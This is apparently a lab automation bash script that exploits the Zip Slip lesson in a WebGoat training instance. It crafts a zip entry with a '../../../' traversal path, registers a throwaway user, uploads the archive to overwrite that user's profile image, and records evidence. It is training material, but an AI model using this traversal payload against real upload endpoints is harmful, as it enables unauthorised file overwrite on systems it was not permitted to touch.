#!/usr/bin/env bash
set -Eeuo pipefail
WG="${WG:-http://<lab-ip>:8080/WebGoat}"
RUN_ID="webgoat_zipslip_overwrite_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/evidence"
J="$OUT/http/cookies.txt"
WG_USER="zs$(date -u +%H%M%S)"
WG_PASS="webgoat"
MARKER="WG_ZIPSLIP_${RUN_ID}"
IMG="$OUT/evidence/${WG_USER}.jpg"
ZIP="$OUT/evidence/profile.zip"
printf '%s\n' "$MARKER" > "$IMG"
python3 - "$ZIP" "$WG_USER" "$IMG" <<'PY'
import sys, zipfile
zip_path, user, img = sys.argv[1:]
entry = f"../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/{user}/{user}.jpg"
with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
    z.write(img, entry)
print(entry)
PY
PRE=$(curl -sS -m 8 -o "$OUT/http/pre_login.html" -w '%{http_code}' -c "$J" "$WG/login" || echo 000)
curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/register.mvc" -d "username=$WG_USER&password=$WG_PASS&matchingPassword=$WG_PASS&agree=agree" -o "$OUT/http/register.html" >/dev/null
LOGIN=$(curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/login" -d "username=$WG_USER&password=$WG_PASS" -o "$OUT/http/login_post.html" -w '%{http_code}' || echo 000)
LESSON=$(curl -sS -m 8 -b "$J" -c "$J" "$WG/PathTraversal.lesson" -o "$OUT/http/PathTraversal.lesson.html" -w '%{http_code}' || echo 000)
ZIPSTATUS=$(curl -sS -m 12 -b "$J" -c "$J" -X POST "$WG/PathTraversal/zip-slip" \
  -F "uploadedFileZipSlip=@$ZIP;type=application/zip;filename=profile.zip" \
  -F "fullName=$WG_USER" -F "email=test@test.com" -F "password=test" \
  -o "$OUT/evidence/zipslip_upload.json" -w '%{http_code}' || echo 000)
PROFILE=$(curl -sS -m 8 -b "$J" -c "$J" "$WG/PathTraversal/profile-picture" -o "$OUT/evidence/profile_picture_base64.txt" -w '%{http_code}' || echo 000)
POST=$(curl -sS -m 8 -o "$OUT/http/post_login.html" -w '%{http_code}' -b "$J" "$WG/login" || echo 000)
SUCCESS=no
if grep -q 'lessonCompleted" : true' "$OUT/evidence/zipslip_upload.json" || grep -q 'lessonCompleted":true' "$OUT/evidence/zipslip_upload.json"; then SUCCESS=yes; fi
python3 - "$OUT/observations.jsonl" "$WG" "$PRE" "$LOGIN" "$LESSON" "$ZIPSTATUS" "$PROFILE" "$POST" "$SUCCESS" <<'PY'
import json, sys, time
_, path, target, pre, login, lesson, zipstatus, profile, post, success = sys.argv
obj={"ts":time.time(),"category":"zip_slip","route":"<attacker-vm>-v2_to_kali-victim-lab","target":target,"pre_health":pre,"login_status":login,"lesson_status":lesson,"zip_upload_status":zipstatus,"profile_status":profile,"post_health":post,"zipslip_success":success,"report_readiness":"local_learning","destructive_lab":"bounded_profile_image_overwrite"}
open(path,'w',encoding='utf-8').write(json.dumps(obj,sort_keys=True)+'\n')
PY
cat > "$OUT/summary.md" <<EOF
# WebGoat Zip Slip Profile Overwrite Wave

run_id: $RUN_ID
target: $WG
user: $WG_USER
marker: $MARKER
pre_health: $PRE
login_status: $LOGIN
lesson_status: $LESSON
zip_upload_status: $ZIPSTATUS
zip_slip_success: $SUCCESS
profile_picture_status: $PROFILE
post_health: $POST

## Evidence
- zip payload: evidence/profile.zip
- marker source image: evidence/${WG_USER}.jpg
- zip upload response: evidence/zipslip_upload.json
- profile picture response: evidence/profile_picture_base64.txt
- lesson source: http/PathTraversal.lesson.html
- observations: observations.jsonl

## Impact boundary
Authorized local-lab Zip Slip/path traversal proof. The zip entry intentionally traverses outside the extraction directory to overwrite the throwaway user's WebGoat profile image only. No system binaries, shell, persistence, secrets, public target, or credential theft.

## Cleanup/recovery
WebGoat health stayed $POST; no VM restore was required. If cleanup is desired, reset/restart WebGoat or restore victim snapshot.
EOF
if [ "$SUCCESS" = yes ] && [ "$POST" = 200 ]; then echo "$OUT"; exit 0; fi
echo "$OUT"; exit 4
